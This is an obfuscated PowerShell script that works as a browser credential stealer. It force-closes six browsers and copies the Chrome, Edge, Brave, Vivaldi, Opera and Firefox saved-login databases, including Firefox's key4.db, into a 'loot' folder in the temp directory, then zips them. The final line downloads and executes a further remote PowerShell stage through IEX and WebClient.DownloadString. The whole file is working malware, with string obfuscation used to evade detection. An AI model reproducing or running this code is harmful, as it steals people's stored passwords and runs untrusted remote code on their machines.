${Er`RORA`CTion`P`REfERE`Nce} = ("{3}{2}{1}{0}"-f'ue','tin','yCon','Silentl')


${ou`Tp`UT} = "$env:TEMP\loot"
&("{2}{0}{1}"-f'e','w-Item','N') -ItemType ("{2}{0}{1}"-f'ecto','ry','Dir') -Force -Path ${O`U`TpUt} | &("{2}{1}{0}" -f'l','ut-Nul','O')


${PRo`Cs} = @(("{1}{0}" -f'hrome','c'), ("{1}{0}"-f 'ox','firef'), ("{0}{1}" -f 'br','ave'), ("{0}{1}"-f'o','pera'), ("{1}{0}" -f'aldi','viv'), ("{1}{0}" -f 'ge','msed'))
foreach (${P`Roc} in ${PRO`cs}) { &("{3}{2}{1}{0}" -f'ocess','r','-P','Stop') -Name ${P`ROC} -Force }
&("{0}{2}{1}"-f'S','-Sleep','tart') -Seconds 2


function S`Teal`-CHR`O`MIUM(${N`AME}, ${B`AsEP`Ath}, ${pR`Ofi`lEF`Il`Ter}) {
    if (-not (&("{2}{1}{0}{3}" -f'-P','t','Tes','ath') ${bAs`E`PATH})) { return }
    
    ${P`RO`FIl`ES} = &("{0}{2}{1}"-f 'Ge','hildItem','t-C') ${B`ASEpa`TH} -Directory | .("{1}{2}{0}"-f'ect','Where','-Obj') {
        ${_}."NA`ME" -match ${pR`of`ILEFI`lt`eR}
    }
    
    foreach (${pROF`ILe} in ${PrOfI`L`es}) {
        ${l`OgIn`data} = "$($profile.FullName)\Login Data "
        if (.("{2}{0}{1}"-f'-Pat','h','Test') ${l`Og`I`NData}) {
            &("{1}{0}{2}"-f'-It','Copy','em') ${lOg`iND`ATA} "$output\${name}_$($profile.Name)_LoginData" -Force
            .("{0}{2}{1}" -f 'Wri','t','te-Hos') ("[+] $name $($profile.Name) credentials copied ")
        }
    }
}


&("{0}{3}{4}{2}{1}"-f 'St','um','mi','eal-','Chro') ("{1}{0}"-f'me','Chro')  ("$env:LOCALAPPDATA\Google\Chrome\User "+'D'+'ata')                    ("^Default$|^Profile "+"\d+$")
.("{1}{3}{4}{0}{2}" -f 'mi','Ste','um','al-Ch','ro') ("{1}{0}"-f'e','Edg')    ("$env:LOCALAPPDATA\Microsoft\Edge\User "+'D'+'ata')                   ("^Default$|^Profile "+"\d+$")
.("{0}{3}{1}{2}" -f 'S','omi','um','teal-Chr') ("{1}{0}"-f'rave','B')   ("$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User "+'D'+'ata')      ("^Default$|^Profile "+"\d+$")
.("{3}{0}{4}{1}{2}"-f'tea','r','omium','S','l-Ch') ("{0}{1}" -f'Viva','ldi') ("$env:LOCALAPPDATA\Vivaldi\User "+'Dat'+'a')                          ("^Default$|^Profile "+"\d+$")


${OpeR`Alo`g`in} = ("$env:APPDATA\Opera "+(('Soft'+'w'+'areI'+'x'+'1Opera ') -REpLaCe 'Ix1',[cHar]92)+('Sta'+'bl'+'e'+'{'+'0}L'+'ogin ') -f[CHaR]92+'Da'+'ta')
if (.("{0}{2}{1}"-f'Test-P','th','a') ${oP`e`RAlOGiN}) {
    &("{2}{1}{0}" -f'tem','I','Copy-') ${oP`eRaL`o`GIN} "$output\Opera_LoginData" -Force
    &("{2}{1}{0}"-f 'st','rite-Ho','W') ("{4}{2}{5}{6}{0}{1}{3}"-f ' cr','ed','+]','entials copied','[',' Ope','ra')
}


${f`ir`eFoXpath} = "$env:APPDATA\Mozilla\Firefox\Profiles"
if (&("{1}{2}{0}"-f'st-Path','T','e') ${Fi`Ref`OxPA`Th}) {
    foreach (${P`R`oFILe} in (.("{0}{1}{2}{3}{4}"-f'G','et-Chil','d','It','em') ${FIrEF`o`xPaTH} -Directory)) {
        ${L`oginS} = "$($profile.FullName)\logins.json"
        ${K`EY}    = "$($profile.FullName)\key4.db"
        if (&("{1}{0}{2}{3}"-f's','Te','t-P','ath') ${lo`GInS}) {
            .("{0}{1}{2}" -f'Cop','y-','Item') ${LOGI`NS} "$output\Firefox_$($profile.Name)_logins.json" -Force
            &("{2}{1}{0}"-f 'm','te','Copy-I') ${k`eY}    "$output\Firefox_$($profile.Name)_key4.db"    -Force
            .("{3}{0}{1}{2}"-f 'r','ite-H','ost','W') ("[+] Firefox $($profile.Name) credentials copied ")
        }
    }
}


${F`oUND} = &("{3}{2}{0}{1}"-f'il','dItem','-Ch','Get') ${ouT`p`Ut}
&("{2}{0}{1}" -f 'os','t','Write-H') ("`n[+] $($found.Count) fichiers recuperes ")


.("{0}{1}{3}{2}"-f 'C','ompres','e','s-Archiv') -Path ${OU`Tput} -DestinationPath "$env:TEMP\loot.zip" -Force
&("{2}{3}{1}{0}" -f 't','os','Write-','H') ('[+]'+' '+'L'+'oot '+'com'+'pre'+'sse '+': '+"$env:TEMP\loot.zip")


${u`RL} = ("{10}{4}{6}{3}{0}{12}{2}{11}{1}{7}{9}{8}{13}{5}" -f's','im','r','om/a','rconten','1','t.c','ulationStealer/main/St','3.','age','https://raw.githubuse','ouel/S','mae','ps')
&("{0}{1}"-f'IE','X') (.("{2}{0}{3}{1}" -f '-Obj','t','New','ec') ("{1}{3}{2}{0}" -f 't','Net.We','Clien','b')).("{1}{0}{2}{3}"-f'nlo','Dow','adSt','ring').Invoke(${u`Rl})
